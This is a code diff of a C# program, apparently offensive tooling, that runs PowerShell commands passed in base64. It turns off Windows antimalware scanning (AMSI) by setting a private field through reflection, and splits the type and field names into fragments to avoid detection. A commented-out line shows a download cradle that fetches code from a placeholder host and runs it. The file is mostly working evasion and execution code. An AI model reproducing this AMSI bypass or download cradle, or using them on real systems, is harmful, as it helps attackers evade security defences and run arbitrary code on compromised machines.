@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.ObjectModel;
 using System.Diagnostics;
 using System.Management.Automation;
@@ -12,25 +12,43 @@ namespace TestExe
     {
         static void Main(string[] args)
         {
+            if (args.Length == 0)
+            {
+                Console.WriteLine("[-] You need input some commands.");
+                return;
+            }
+
             Runspace mySpace = RunspaceFactory.CreateRunspace();
             mySpace.Open();
-            Pipeline myPipeLine = mySpace.CreatePipeline();
-            mySpace.GetType().Assembly.GetType("Syste" + "m.Managem" + "ent.Autom" + "ation.AmsiU" + "tils").GetField("am" + "siInitF" + "ailed", BindingFlags.NonPublic | BindingFlags.Static).SetValue(null, true);
-            Console.WriteLine(args[0].Replace("+", " "));
-            myPipeLine.Commands.AddScript(args[0].Replace("+"," "));
-            //myPipeLine.Commands.AddScript("IEX ((new-object net.webclient).downloadstring('http://ip:port/a'))");
-            Collection<PSObject> outputs = myPipeLine.Invoke();
-            mySpace.Close();
-
-            System.Text.StringBuilder sb = new StringBuilder();
-
-            foreach (PSObject pobject in outputs)
+            try
             {
-
-                sb.AppendLine(pobject.ToString());
-
+                mySpace.GetType().Assembly.GetType("Syste" + "m.Managem" + "ent.Autom" + "ation.AmsiU" + "tils").GetField("am" + "siInitF" + "ailed", BindingFlags.NonPublic | BindingFlags.Static).SetValue(null, true);
             }
-            Console.WriteLine(sb.ToString());
+            catch
+            {
+                Console.WriteLine("[-] Maybe you needn't bypass.");
+            }
+
+            Pipeline myPipeLine = mySpace.CreatePipeline();
+
+            try {
+                myPipeLine.Commands.AddScript(Encoding.UTF8.GetString(Convert.FromBase64String(args[0])));
+                //myPipeLine.Commands.AddScript("IEX ((new-object net.webclient).downloadstring('http://ip:port/a'))");
+                Collection<PSObject>  outputs = myPipeLine.Invoke();
+                System.Text.StringBuilder sb = new StringBuilder();
+                foreach (PSObject pobject in outputs)
+                {
+
+                    sb.AppendLine(pobject.ToString());
+
+                }
+                Console.WriteLine(sb.ToString());
+            }
+            catch{
+                Console.WriteLine("[-] something wrong with commands.");
+            }
+
+            mySpace.Close();
         }
     }
 }
